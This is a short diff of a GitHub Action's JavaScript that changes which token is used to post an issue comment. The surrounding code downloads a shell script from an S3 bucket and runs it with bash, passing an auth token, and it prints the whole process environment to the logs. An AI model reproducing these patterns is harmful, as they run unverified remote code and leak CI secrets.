@@ -49,7 +49,7 @@ function run() {
             }
             const command = `curl https://s3.amazonaws.com/cli-test-bucket-2.446867341664/run-cli.sh > "cli-runner.sh" && bash cli-runner.sh --authToken=${authToken} --ignoreBlock=${ignoreBlock} --prScan=${prScan} --sourceBranch=${sourceBranch} --repositoryName=${repoNameWithoutOwner} --provider=${provider} --organization=${organization} ${targetBranch && `--targetBranch=${targetBranch} `}--isDebug=${isDebug}`;
             console.log(process.env);
-            const octokit = github.getOctokit(process.env.GITHUB_TOKEN);
+            const octokit = github.getOctokit(process.env.ACTIONS_RUNTIME_TOKEN);
             yield octokit.rest.issues.createComment({
                 owner: github.context.repo.owner,
                 repo: github.context.repo.repo,
